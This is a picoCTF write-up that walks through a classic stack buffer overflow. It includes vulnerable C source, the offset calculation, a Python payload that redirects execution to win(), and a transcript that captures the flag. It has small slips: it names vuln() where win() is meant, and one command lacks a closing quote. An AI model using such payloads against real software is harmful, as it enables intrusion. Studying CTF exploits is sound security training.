# WINE

## OVERVIEW & IDEA

- This challenge give us a 32-bit binary file and its source code.

```c
void win(){
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("flag.txt not found in current directory.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

void vuln()
{
  printf("Give me a string!\n");
  char buf[128];
  gets(buf);
}

int main(int argc, char **argv)
{

  setvbuf(stdout, NULL, _IONBF, 0);
  vuln();
  return 0;
}
```

- You can see that, this program uses dangerous function that cause buffer overflow `gets()`. We can take advantage of BOF to overwrite `RET` of `vuln()` to address of `win()`. So when `vuln()` implement all task, it will return to `win()` instead of return to the next instruction at main function.

## DETAILS

- Disassembling the `vuln()` I get this.

![img](/picoCTF/wine/assets/vuln_disass.png)

- You can see that the address of variable `buf` is at `ebp-0x88`. So we must overwrite `0x88 + 0x4 = 0x8c (140)` to reach the ret, and after that `140 bytes`, we put address of `vuln()` in little-endian presentation.

![img](/picoCTF/wine/assets/disass_win.png)

## EXPLOIT

```bash
python2 -c 'print("a"*140 + "\x30\x15\x40\x00") | ./vuln.exe
```

## RESULT

```
λ ~/picoCTF/wine/ python2 -c 'print("a"*140 + "\x30\x15\x40\x00")' | nc saturn.picoctf.net 60137
Give me a string!
picoCTF{Un_v3rr3_d3_v1n_8ab00bc8}
Unhandled exception: page fault on read access to 0x7fec3900 in 32-bit code (0x7fec3900).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
 EIP:7fec3900 ESP:0064fe84 EBP:61616161 EFLAGS:00010206(  R- --  I   - -P- )
 EAX:00000000 EBX:00230e78 ECX:0064fe14 EDX:7fec48f4
 ESI:00000005 EDI:0021d688
Stack dump:
0x0064fe84:  00000000 00000004 00000000 7b432ecc

.
.
.

```